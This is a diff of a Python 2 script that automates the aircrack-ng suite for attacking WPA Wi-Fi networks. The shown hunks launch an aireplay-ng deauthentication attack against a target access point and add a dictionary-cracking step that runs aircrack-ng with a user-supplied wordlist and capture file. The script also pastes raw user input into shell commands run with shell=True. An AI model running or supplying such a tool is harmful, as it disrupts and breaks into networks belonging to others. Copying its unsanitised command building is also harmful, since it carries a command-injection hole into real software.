@@ -1,6 +1,6 @@
 import subprocess
 
-print "Automation tool for air*-ng suite by Zarkopafilis"
+print "Automation tool for air*-ng (WPA) suite by Zarkopafilis"
 print ""
 print "> ifconfig"
 out = subprocess.check_output("ifconfig")
@@ -33,6 +33,9 @@ x = raw_input("Start aireplay-ng targeted deauth > ")
 cmd = "aireplay-ng --deauth " + packetCount+ " -a " + bssid + " " + interface
 print "> " + cmd
 subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
-dumpFileName = raw_input("Enter dump file name > ")
-dumpFile = dumpFilePrefix + dumpFileName;
+dumpFile = raw_input("Enter dump file > ")
+wordlistFile = raw_input("Enter word list > ")
+cmd = "aircrack-ng -w " + wordlistFile + " -b " + bssid + " " + dumpFile
 x = raw_input("Start aircrack-ng when ready > ")
+print "> " + cmd
+subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
